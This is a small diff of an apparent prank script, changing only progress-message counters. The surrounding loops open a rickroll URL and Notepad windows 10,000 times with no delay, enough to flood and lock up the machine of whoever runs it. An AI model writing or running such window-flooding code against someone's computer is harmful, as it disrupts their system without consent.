@@ -79,7 +79,7 @@ def open_rickroll():
     for i in range(10000):
         url = base_url + f"&i={i}"
 
-        print(f"[{i+1}/1000] Opening rickroll...")
+        print(f"[{i+1}/10000] Opening rickroll...")
         open_url(url)
 
         time.sleep(0.0)
@@ -101,7 +101,7 @@ By |@Not3Rey| project"""
 
         for i in range(10000):
 
-            print(f"[{i+1}/1000] Opening notepad...")
+            print(f"[{i+1}/10000] Opening notepad...")
 
             path = os.path.join(
                 tempfile.gettempdir(),
